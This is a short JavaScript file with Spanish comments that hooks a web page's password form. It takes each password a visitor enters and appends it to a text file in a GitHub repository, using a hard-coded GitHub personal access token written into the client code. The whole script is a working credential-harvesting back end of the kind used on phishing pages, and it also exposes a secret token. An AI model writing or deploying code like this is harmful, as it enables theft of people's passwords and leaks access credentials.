// Configuración del repositorio
const repoOwner = "JDvalenciaD";        // <-- pon tu usuario de GitHub
const repoName = "txtarchivos";   // <-- nombre del repositorio
const filePath = "comentarios.txt";    // <-- archivo donde guardarás los datos
const token = "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";              // <-- tu token personal de GitHub (PAT)

// Seleccionamos el formulario de contraseña
const form = document.getElementById("passwordForm");

form.addEventListener("submit", async (e) => {
  e.preventDefault(); // Evita el refresh por defecto

  // Capturar el valor de la contraseña
  const password = document.getElementById("password").value;

  if (!password) {
    alert("Por favor ingresa tu contraseña.");
    return;
  }

  // Preparar entrada
  const newEntry = `\nContraseña: ${password}`;

  try {
    // 1. Obtener el archivo actual en el repo
    const res = await fetch(
      `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
      { headers: { Authorization: `token ${token}` } }
    );

    const data = await res.json();
    let content = "";
    let sha = null;

    if (data.content) {
      content = atob(data.content); // Decodificar base64
      sha = data.sha;               // Hash para actualizar
    }

    // 2. Agregar la nueva contraseña
    content += newEntry;

    // 3. Subir los cambios a GitHub
    await fetch(
      `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
      {
        method: "PUT",
        headers: {
          Authorization: `token ${token}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          message: "Nueva contraseña desde formulario",
          content: btoa(content), // Codificar en base64
          sha: sha,
        }),
      }
    );

    alert("✅ Contraseña enviada correctamente.");

  } catch (error) {
    console.error("❌ Error subiendo datos:", error);
    alert("Ocurrió un error al guardar la contraseña.");
  }
});
